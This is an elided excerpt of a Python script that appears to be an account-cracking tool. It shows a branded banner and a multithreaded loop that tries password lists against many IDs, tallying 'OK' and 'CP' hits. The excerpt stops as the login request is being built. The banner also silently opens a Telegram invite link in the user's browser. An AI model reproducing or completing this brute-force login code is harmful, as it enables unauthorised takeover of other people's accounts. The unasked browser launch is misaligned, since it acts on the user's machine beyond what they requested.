...
class Mr_Code:
    ...
    def banner(self):
        os.system("clear")
        os.system("xdg-open https://t.me/+m_VXsUjZetI3Yjg1")
        print("\033[38;5;46m======================")
        print("\033[38;5;46m🌺𝐁𝐃-𝐂𝐘𝐁𝐄𝐑-𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘-𝟎𝟒𝟗𝟗 𝐓𝐄𝐀𝐌🌺")
        print("\033[38;5;46m🌺𝐁𝐎𝐗 𝐂𝐄𝐎 𝐄𝐇𝐂 𝐄𝐌𝐑𝐀𝐍🌺")
        print("\033[38;5;46m🌺𝐁𝐎𝐗 𝐐𝐂 𝐒𝐀𝐆𝐎𝐑🌺")       
        print("\033[38;5;46m🌺𝐁𝐎𝐗 𝐀𝐃𝐌𝐈𝐍 𝐒𝐇𝐀𝐇𝐄𝐃🌺")
        print("\033[38;5;46m🌺𝐁𝐎𝐗 𝐀𝐃𝐌𝐈𝐍 𝐑𝐀𝐈𝐘𝐀𝐍 𝐊𝐇𝐀𝐍🌺")
        print("\033[38;5;46m🌺𝐁𝐎𝐗 𝐀𝐃𝐌𝐈𝐍 𝐌𝐃 𝐌𝐀𝐌𝐔𝐍🌺")
        print("\033[38;5;46m𝐖𝐎𝐑𝐊𝐈𝐍𝐆 𝐎𝐍𝐋𝐘 𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇🌺")   
        print("\033[38;5;46m𝐃𝐀𝐓𝐀 + 𝐖𝐈𝐅𝐢 𝐖𝐎𝐑𝐊𝐈𝐍𝐆 𝐑𝐀𝐍𝐃𝐎𝐌🌺")       
        print("\033[38;5;46m======================")
    ...
    def Main(self):
        ...
        with tred(max_workers=30) as randx:
            print("\033[38;5;46m𝙀𝙃𝘾 𝘾𝙔𝘽𝙀𝙍 𝙀𝙈𝙍𝘼𝙉")           
    ...
    def method(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[mEHC-EMRAN {self.loop}|RND|OK:-{len(self.oks)}|CP:-{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
